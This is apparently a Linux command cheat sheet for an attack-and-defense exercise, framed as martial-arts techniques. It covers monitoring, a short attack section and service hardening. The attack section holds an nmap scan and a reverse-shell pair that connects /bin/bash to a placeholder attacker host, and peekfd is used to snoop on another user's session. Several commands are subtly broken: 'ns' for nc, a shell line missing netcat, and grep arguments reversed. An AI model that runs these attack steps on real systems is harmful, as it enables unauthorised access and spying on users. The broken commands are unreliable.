# Waza 技 (technique)

## Yomi Waza 読み技 (monitoring technique)

1. read the manual
   1. get documentation about a command
   ```bash
   man $COMMAND
   ```
   2. know services name and their ports 
   ```bash
   less /etc/services
   ```

2. sessions (who is doing what)
   1. <a href="who">who</a> 
   ```bash
   w
   ```
   2. observe session
   ```bash
   session=pts/0 #session to watch
   ps -fat #find pts/0 Ss in the list and look at the PID column
   peekfd -8cnd $PID 0 1 2
   ```

3. ports
   1. what port is doing what

   ```bash
   netstat -tulpn
   ```

   ```bash
   ss -tulpn
   ```

4. processes
   1. list processes
```bash
ps -aux
```
   2. watch activity
```bash
top
```
```bash
htop
```

5. filter & search
   1. browse

display content of a file
```bash
cat $FILENAME
```

browse file content then press 'q' to quit use '/' to search keyword
```bash
more $FILE1
```
```bash
less $FILE1
```

read each newline coming into the file then press 'q' to quit
```bash
tail -f $FILE1
```

   2. filter

catch lines in a file with a given keyword
```bash
grep $FILENAME $KEYWORD
```
   1. pipe chain

chain two commands give the result of the first command to the second one.
```bash
$COMMAND1 | $COMMAND2
```

6. events
   1. logs

```bash
tail -f /var/log/syslog
```
7. communications
   1. firewall Logging

record in syslog new connection incoming
```bash
iptables -A INPUT -p tcp -m state --state NEW -j LOG --log-prefix "INCOMING connection "
```
record in syslog new connection outgoing
```bash
iptables -A OUTPUT -p tcp -m state --state NEW -j LOG --log-prefix "OUTGOING connection "
```

   1. content listening
      1. for general listening of the network activity
      ```bash
      tcpdump -i any -nn -q
      ```
      2. to focus on specific network activity
      ```bash
      tcpdump -ttttnnvvSX -c$NUMBER_OF_PACKETS_TO_READ src $SOURCE_IP_ADDRESS and dst port $DESTINATION_PORT
      ```
   



## Tori Waza 取り技 (attack technique)

1. discovery
   1. network scan
   ```bash
   nmap $UKE_IP_ADRESS
   ```
2. Reverse shell
   1. wait for the reverse shell connection
   ```bash
   ns -lvnp 4444
   ```
   2. connect the reverse shell
   ```bash
   nohup TORI_IP 4444 -e /bin/bash
   ```



## Uke Waza</a> 受け技 (defense technique)

1. sessions
   1. kill session
   get tty with [who](yomi waza who) then
   ```bash
   pkill -9 -t $TTY
   ```
2. ports
   1. change ssh port
   ```bash
   echo "Port 2222" | sudo tee -a /etc/ssh/sshd_config && sudo systemctl restart ssh
   ```
   2. change telnet port
   ```bash
   echo -e "telnet\t4444/tcp" | sudo tee -a /etc/services && sudo systemctl restart xinetd
   ```
   3. change ftp port
   ```bash
   echo "0.0.0.0,2121" | sudo tee /etc/pure-ftpd/conf/Bind >/dev/null && sudo systemctl restart pure-ftpd
   ```
3. processes
4. communications